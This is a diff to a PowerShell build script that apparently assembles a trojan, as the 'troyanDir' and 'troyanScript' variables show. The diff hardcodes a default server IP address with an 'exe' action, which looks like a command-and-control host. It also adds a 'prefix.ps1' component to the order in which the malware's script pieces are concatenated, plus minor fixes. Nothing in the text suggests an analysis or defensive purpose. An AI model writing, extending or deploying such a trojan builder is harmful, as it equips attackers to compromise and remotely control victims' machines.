@@ -1,6 +1,12 @@
 param (
     [string]$serverName
 )
+
+if ($serverName -eq "") {
+    $serverName = "185.247.141.125"
+    $action = "exe"
+} 
+
 if ([string]::IsNullOrEmpty($serverName)) {
         throw "-serverName argument is null"
 }
@@ -35,9 +41,9 @@ function GetUtfNoBom {
     return $contentWithoutBom
 }
 
-
-if (-not (Test-Path $server.troyanDir)) {
-    New-Item -Path $server.troyanDir -ItemType Directory
+$outPath = Join-Path -Path $server.troyanDir -ChildPath "_output"
+if (-not (Test-Path $outPath )) {
+    New-Item -Path $outPath  -ItemType Directory
 }
 if (Test-Path -Path $server.troyanScript) {
     Remove-Item -Path $server.troyanScript
@@ -136,7 +142,7 @@ Function Check-Array {
         [object]$InputObject
     )
 
-    if ($null -ne $InputObject -and $InputObject.Length -gt 0) {
+    if ($null -ne $InputObject -and $InputObject.Length -gt 0 -and $InputObject -ne '') {
         return $true
     } else {
         return $false
@@ -253,9 +259,10 @@ $template | Set-Content -Path (Join-Path -Path $server.troyanScriptDir -ChildPat
 
 #join
 $ps1Files = @(
+    @(Get-ChildItem -Path $server.troyanScriptDir -Filter "prefix.ps1"),
     @(Get-ChildItem -Path $server.troyanScriptDir -Filter "consts.ps1"),
     @(Get-ChildItem -Path $server.troyanScriptDir -Filter "utils.ps1"),
-    @(Get-ChildItem -Path $server.troyanScriptDir -Filter "*.ps1" | Where-Object { $_.Name -ne "extraupdate.ps1" -and $_.Name -ne "utils.ps1" -and $_.Name -ne "consts.ps1"  -and $_.Name -ne "program.ps1" })
+    @(Get-ChildItem -Path $server.troyanScriptDir -Filter "*.ps1" | Where-Object { $_.Name -ne "extraupdate.ps1" -and $_.Name -ne "prefix.ps1" -and $_.Name -ne "utils.ps1" -and $_.Name -ne "consts.ps1"  -and $_.Name -ne "program.ps1" })
 ) | ForEach-Object { $_ } | Where-Object { $_ -ne $null }
 
 if ($server.autoUpdate)
